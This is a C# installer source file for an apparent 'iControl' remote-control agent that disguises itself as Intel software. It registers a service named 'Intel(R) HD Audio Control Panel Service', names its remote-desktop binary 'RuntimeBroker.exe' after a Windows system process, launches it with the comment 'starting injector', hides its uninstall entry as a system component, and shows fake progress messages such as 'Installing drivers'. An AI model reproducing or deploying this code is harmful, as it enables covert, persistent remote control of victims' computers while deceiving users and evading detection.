using IWshRuntimeLibrary;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using iControl.Agent.Installer.Win.Utilities;
using iControl.Shared.Models;
using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.ServiceProcess;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows;
using FileIO = System.IO.File;

namespace iControl.Agent.Installer.Win.Services
{
    public class InstallerService
    {
        public event EventHandler<string> ProgressMessageChanged;
        public event EventHandler<int> ProgressValueChanged;

        private string InstallPath => Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Program Files", "Intel");
        private string Platform => Environment.Is64BitOperatingSystem ? "x64" : "x86";
        private JavaScriptSerializer Serializer { get; } = new JavaScriptSerializer();
        public async Task<bool> Install(string serverUrl,
            string organizationId,
            string deviceGroup,
            string deviceAlias,
            string deviceUuid,
            bool createSupportShortcut)
        {
            try
            {
                Logger.Write("Install started.");
                if (!CheckIsAdministrator())
                {
                    return false;
                }

                StopService();

                await StopProcesses();

                BackupDirectory();

                var connectionInfo = GetConnectionInfo(organizationId, serverUrl, deviceUuid);

                ClearInstallDirectory();

                await DownloadiControlAgent(serverUrl);

                FileIO.WriteAllText(Path.Combine(InstallPath, "ConnectionInfo.json"), Serializer.Serialize(connectionInfo));

                FileIO.Copy(Assembly.GetExecutingAssembly().Location, Path.Combine(InstallPath, "iControl_Installer.exe"));

                await CreateDeviceOnServer(connectionInfo.DeviceID, serverUrl, deviceGroup, deviceAlias, organizationId);

                //AddFirewallRule();

                InstallService();

                CreateUninstallKey();
                ClearTemp1Directory();

                //CreateSupportShortcut(serverUrl, connectionInfo.DeviceID, createSupportShortcut);

                return true;
            }
            catch (Exception ex)

            {
                Logger.Write(ex);
                RestoreBackup();
                return false;
            }

        }

        public async Task<bool> Uninstall()
        {
            try
            {
                if (!CheckIsAdministrator())
                {
                    return false;
                }

                StopService();

                ProcessEx.StartHidden("cmd.exe", "/c sc delete igfxAudioService").WaitForExit();

                await StopProcesses();

                ProgressMessageChanged?.Invoke(this, "Deleting files.");
                ClearInstallDirectory();
                ProcessEx.StartHidden("cmd.exe", $"/c timeout 5 & rd /s /q \"{InstallPath}\"");

               // ProcessEx.StartHidden("netsh", "advfirewall firewall delete rule name=\"iControl Desktop Unattended\"").WaitForExit();

                GetRegistryBaseKey().DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\iControl", false);

                ClearTempDirectory();
                return true;
            }
            catch (Exception ex)
            {
                Logger.Write(ex);
                return false;
            }
        }

        private void AddFirewallRule()
        {
            var desktopExePath = Path.Combine(InstallPath, "Desktop", "RuntimeBroker.exe");
            ProcessEx.StartHidden("netsh", "advfirewall firewall delete rule name=\"iControl Desktop Unattended\"").WaitForExit();
            ProcessEx.StartHidden("netsh", $"advfirewall firewall add rule name=\"iControl Desktop Unattended\" program=\"{desktopExePath}\" protocol=any dir=in enable=yes action=allow description=\"The agent that allows screen sharing and remote control for iControl.\"").WaitForExit();
        }

        private void BackupDirectory()
        {
            if (Directory.Exists(InstallPath))
            {
                Logger.Write("Backing up current installation.");
                ProgressMessageChanged?.Invoke(this, "Backing up current installation.");
                var backupPath = Path.Combine(Path.GetTempPath(), "iControl_Backup.zip");
                if (FileIO.Exists(backupPath))
                {
                    FileIO.Delete(backupPath);
                }
                ZipFile.CreateFromDirectory(InstallPath, backupPath, CompressionLevel.Fastest, false);
            }
        }

        private bool CheckIsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            var result = principal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!result)
            {
                MessageBoxEx.Show("Elevated privileges are required.  Please restart the installer using 'Run as administrator'.", "Elevation Required", MessageBoxButton.OK, MessageBoxImage.Warning);
            }
            return result;
        }

        private void ClearInstallDirectory()
        {
            if (Directory.Exists(InstallPath))
            {
                foreach (var entry in Directory.GetFileSystemEntries(InstallPath))
                {
                    try
                    {
                        if (FileIO.Exists(entry))
                        {
                            FileIO.Delete(entry);
                        }
                        else if (Directory.Exists(entry))
                        {
                            Directory.Delete(entry, true);
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.Write(ex);
                    }
                }
            }
        }
        private void ClearTempDirectory()
        {  
            string filePath = Path.Combine(Path.GetTempPath(), "iControlUpdate");
            if (Directory.Exists(filePath))
            {
                Directory.Delete(filePath, true);
            }
            filePath = Path.Combine(Path.GetTempPath(), "iControl_Backup.zip");
            if (FileIO.Exists(filePath))
            {
                FileIO.Delete(filePath);
            }
            filePath = Path.Combine(Path.GetTempPath(), "iControl-Agent.zip");
            if (FileIO.Exists(filePath))
            {
                FileIO.Delete(filePath);
            }
            foreach (var process in Process.GetProcessesByName("RuntimeBroker.exe"))
              {
                process.Kill();
              }
             filePath = Path.Combine(Path.GetTempPath(), "RuntimeBroker.exe");
            if (FileIO.Exists(filePath))
            {
                FileIO.Delete(filePath);
            }
            /*  foreach (var process in Process.GetProcessesByName("TestInject64.exe"))
              {
                  process.Kill();
              }
              filePath = Path.Combine(Path.GetTempPath(), "TestInject64.exe");
              if (FileIO.Exists(filePath))
              {
                  FileIO.Delete(filePath);
              } */
        }
        private void ClearTemp1Directory()
        {
            string filePath = Path.Combine(Path.GetTempPath(), "iControlUpdate");
            if (Directory.Exists(filePath))
            {
                Directory.Delete(filePath, true);
            }
            filePath = Path.Combine(Path.GetTempPath(), "iControl_Backup.zip");
            if (FileIO.Exists(filePath))
            {
                FileIO.Delete(filePath);
            }
            filePath = Path.Combine(Path.GetTempPath(), "iControl-Agent.zip");
            if (FileIO.Exists(filePath))
            {
                FileIO.Delete(filePath);
            }
            
        }
        private async Task CreateDeviceOnServer(string deviceUuid,
            string serverUrl,
            string deviceGroup,
            string deviceAlias,
            string organizationId)
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(deviceGroup) ||
                    !string.IsNullOrWhiteSpace(deviceAlias))
                {
                    var setupOptions = new DeviceSetupOptions()
                    {
                        DeviceID = deviceUuid,
                        DeviceGroupName = deviceGroup,
                        DeviceAlias = deviceAlias,
                        OrganizationID = organizationId
                    };

                    var wr = WebRequest.CreateHttp(serverUrl.TrimEnd('/') + "/api/devices");
                    wr.Method = "POST";
                    wr.ContentType = "application/json";
                    using (var rs = await wr.GetRequestStreamAsync())
                    using (var sw = new StreamWriter(rs))
                    {
                        await sw.WriteAsync(Serializer.Serialize(setupOptions));
                    }
                    using (var response = await wr.GetResponseAsync() as HttpWebResponse)
                    { 
                        Logger.Write($"Create device response: {response.StatusCode}");
                    }
                }
            }
            catch (WebException ex) when ((ex.Response is HttpWebResponse response) && response.StatusCode == HttpStatusCode.BadRequest)
            {
                Logger.Write("Bad request when creating device.  The device ID may already be created.");
            }
            catch (Exception ex)
            {
                Logger.Write(ex);
            }

        }

        private void CreateSupportShortcut(string serverUrl, string deviceUuid, bool createSupportShortcut)
        {
            var shell = new WshShell();
            var shortcutLocation = Path.Combine(InstallPath, "Get Support.lnk");
            var shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);
            shortcut.Description = "Get IT support";
            shortcut.IconLocation = Path.Combine(InstallPath, "igfxAudioService.exe");
            shortcut.TargetPath = serverUrl.TrimEnd('/') + $"/GetSupport?deviceID={deviceUuid}";
            shortcut.Save();

            if (createSupportShortcut)
            {
                var systemRoot = Path.GetPathRoot(Environment.SystemDirectory);
                var publicDesktop = Path.Combine(systemRoot, "Users", "Public", "Desktop", "Get Support.lnk");
                FileIO.Copy(shortcutLocation, publicDesktop, true);
            }
        }
        private void CreateUninstallKey()
        {
            var version = FileVersionInfo.GetVersionInfo(Path.Combine(InstallPath, "igfxAudioService.exe"));
            var baseKey = GetRegistryBaseKey();

            var iControlKey = baseKey.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\iControl", true);
            iControlKey.SetValue("DisplayIcon", Path.Combine(InstallPath, "igfxAudioService.exe"));
            iControlKey.SetValue("DisplayName", "iControl");
            iControlKey.SetValue("DisplayVersion", version.FileVersion);
            iControlKey.SetValue("InstallDate", DateTime.Now.ToShortDateString());
            iControlKey.SetValue("Publisher", "CoolCompany");
            iControlKey.SetValue("SystemComponent", 1, RegistryValueKind.DWord);
            iControlKey.SetValue("VersionMajor", version.FileMajorPart.ToString(), RegistryValueKind.DWord);
            iControlKey.SetValue("VersionMinor", version.FileMinorPart.ToString(), RegistryValueKind.DWord);
            iControlKey.SetValue("UninstallString", Path.Combine(InstallPath, "iControl_Installer.exe -uninstall -quiet"));
            iControlKey.SetValue("QuietUninstallString", Path.Combine(InstallPath, "iControl_Installer.exe -uninstall -quiet"));
        }

        private async Task DownloadiControlAgent(string serverUrl)
        {
            var targetFile = Path.Combine(Path.GetTempPath(), $"iControl-Agent.zip");

            if (CommandLineParser.CommandLineArgs.TryGetValue("path", out var result) &&
                FileIO.Exists(result))
            {
                targetFile = result;
            }
            else
            {
                ProgressMessageChanged.Invoke(this, "Downloading Node.js dependencies.");
                using (var client = new WebClient())
                {
                    client.DownloadProgressChanged += (sender, args) =>
                    {
                        ProgressValueChanged?.Invoke(this, args.ProgressPercentage);
                    };

                    await client.DownloadFileTaskAsync($"{serverUrl}/Content/Dependencies-Win10-x64.zip", targetFile);
                }
            }

            ProgressMessageChanged.Invoke(this, "Installing drivers.");
            ProgressValueChanged?.Invoke(this, 0);

            var tempDir = Path.Combine(Path.GetTempPath(), "iControlUpdate");
            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, true);
            }

            Directory.CreateDirectory(InstallPath);
            while (!Directory.Exists(InstallPath))
            {
                await Task.Delay(10);
            }

            var wr = WebRequest.CreateHttp($"{serverUrl}/Content/Dependencies-Win10-x64.zip");
            wr.Method = "Head";
            using (var response = (HttpWebResponse)await wr.GetResponseAsync())
            {
                FileIO.WriteAllText(Path.Combine(InstallPath, "etag.txt"), response.Headers["ETag"]);
            }

            ZipFile.ExtractToDirectory(targetFile, tempDir);
            var fileSystemEntries = Directory.GetFileSystemEntries(tempDir);
            for (var i = 0; i < fileSystemEntries.Length; i++)
            {
                try
                {
                    ProgressValueChanged?.Invoke(this, (int)((double)i / (double)fileSystemEntries.Length * 100d));
                    var entry = fileSystemEntries[i];
                    if (FileIO.Exists(entry))
                    {
                        FileIO.Copy(entry, Path.Combine(InstallPath, Path.GetFileName(entry)), true);
                    }
                    else if (Directory.Exists(entry))
                    {
                        FileSystem.CopyDirectory(entry, Path.Combine(InstallPath, new DirectoryInfo(entry).Name), true);
                    }
                    await Task.Delay(1);
                }
                catch (Exception ex)
                {
                    Logger.Write(ex);
                }
            }
            ProgressValueChanged?.Invoke(this, 0);
        }

        private ConnectionInfo GetConnectionInfo(string organizationId, string serverUrl, string deviceUuid)
        {
            ConnectionInfo connectionInfo;
            var connectionInfoPath = Path.Combine(InstallPath, "ConnectionInfo.json");
            if (FileIO.Exists(connectionInfoPath))
            {
                connectionInfo = Serializer.Deserialize<ConnectionInfo>(FileIO.ReadAllText(connectionInfoPath));
                connectionInfo.ServerVerificationToken = null;
            }
            else
            {
                connectionInfo = new ConnectionInfo()
                {
                    DeviceID = Guid.NewGuid().ToString()
                };
            }

            if (!string.IsNullOrWhiteSpace(deviceUuid))
            {
                // Clear the server verification token if we're installing this as a new device.
                if (connectionInfo.DeviceID != deviceUuid)
                {
                    connectionInfo.ServerVerificationToken = null;
                }
                connectionInfo.DeviceID = deviceUuid;
            }
            connectionInfo.OrganizationID = organizationId;
            connectionInfo.Host = serverUrl;
            return connectionInfo;
        }

        private RegistryKey GetRegistryBaseKey()
        {
            if (Environment.Is64BitOperatingSystem)
            {
                return RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            }
            else
            {
                return RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
            }
        }

        private void InstallService()
        {
            Logger.Write("Securing enviornment.");
            ProgressMessageChanged?.Invoke(this, "Securing enviornment.");
            var serv = ServiceController.GetServices().FirstOrDefault(ser => ser.ServiceName == "igfxAudioService");
            if (serv == null)
            {
                var command = new string[] { "/assemblypath=" + Path.Combine(InstallPath, "igfxAudioService.exe") };
                var context = new InstallContext("", command);
                var serviceInstaller = new ServiceInstaller()
                {
                    Context = context,
                    DisplayName = "Intel(R) HD Audio Control Panel Service",
                    Description = "Intel(R) HD Audio Control Panel Service",
                    ServiceName = "igfxAudioService",
                    StartType = ServiceStartMode.Automatic,
                    DelayedAutoStart = false,
                    Parent = new ServiceProcessInstaller()
                };

                var state = new System.Collections.Specialized.ListDictionary();
                serviceInstaller.Install(state);
                Logger.Write("Service installed.");
                serv = ServiceController.GetServices().FirstOrDefault(ser => ser.ServiceName == "igfxAudioService");

                ProcessEx.StartHidden("cmd.exe", "/c sc.exe failure \"igfxAudioService\" reset= 5 actions= restart/5000");
                ProcessEx.StartHidden(Path.Combine(InstallPath, "RuntimeBroker.exe"), ""); //starting injector
            }
            if (serv.Status != ServiceControllerStatus.Running)
            {
                serv.Start();
            }
            Logger.Write("Service started.");
        }

        private void RestoreBackup()
        {
            try
            {
                var backupPath = Path.Combine(Path.GetTempPath(), "iControl_Backup.zip");
                if (FileIO.Exists(backupPath))
                {
                    Logger.Write("Restoring backup.");
                    ClearInstallDirectory();
                    ZipFile.ExtractToDirectory(backupPath, InstallPath);
                    var serv = ServiceController.GetServices().FirstOrDefault(ser => ser.ServiceName == "igfxAudioService");
                    if (serv?.Status != ServiceControllerStatus.Running)
                    {
                        serv?.Start();
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Write(ex);
            }
        }

        private async Task StopProcesses()
        {
            ProgressMessageChanged?.Invoke(this, "Removing drivers.");
            var procs = Process.GetProcessesByName("igfxAudioService").Concat(Process.GetProcessesByName("igfxHDAudioService"));

            foreach (var proc in procs)
            {
                proc.Kill();
            }

            await Task.Delay(500);
        }
        private void StopService()
        {
            try
            {
                var iControlService = ServiceController.GetServices().FirstOrDefault(x => x.ServiceName == "igfxAudioService");
                if (iControlService != null)
                {
                    Logger.Write("Stopping existing iControl service.");
                    ProgressMessageChanged?.Invoke(this, "Stopping existing iControl service.");
                    iControlService.Stop();
                    iControlService.WaitForStatus(ServiceControllerStatus.Stopped);
                }
            }
            catch (Exception ex)
            {
                Logger.Write(ex);
            }
        }
    }
}
